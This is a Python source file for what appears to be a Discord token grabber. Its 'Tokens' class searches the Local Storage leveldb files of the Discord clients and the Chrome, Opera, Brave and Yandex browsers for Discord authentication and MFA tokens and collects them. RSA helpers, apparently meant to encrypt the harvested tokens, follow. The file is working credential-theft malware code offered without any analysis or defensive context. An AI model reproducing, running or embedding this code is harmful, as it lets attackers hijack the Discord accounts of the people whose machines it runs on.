from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
import os
import re


class Tokens:

    @staticmethod
    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    @staticmethod
    def get_tokens():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = []

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            tokens = Tokens.find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message.append(f'{platform} : ' + token)

        return message

    @staticmethod
    def print_tokens():
        tokens = Tokens.get_tokens()
        t = []
        if len(tokens) > 1:
            for idx, tks in enumerate(tokens):
                t.append(str(str(idx) + '. ' + tks))
        return t

    def generate_key(pubpath, privpath):
        key = RSA.generate(2048)
        pub = key.publickey().export_key()
        priv = key.export_key()
        with open(pubpath, "wb") as f:
            f.write(pub)
            f.close()
        with open(privpath, "wb") as f:
            f.write(priv)
            f.close()

    def encrypt(message, path):
        pub = RSA.import_key(open(path).read())
        rsa_enc = PKCS1_OAEP.new(pub)
        message = message.encode("utf-8")
        encrypted = rsa_enc.encrypt(message)
        return encrypted

    def decrypt(message, path):
        priv = RSA.import_key(open(path).read())
        rsa_enc = PKCS1_OAEP.new(priv)
        decrypted = rsa_enc.decrypt(message)
        return decrypted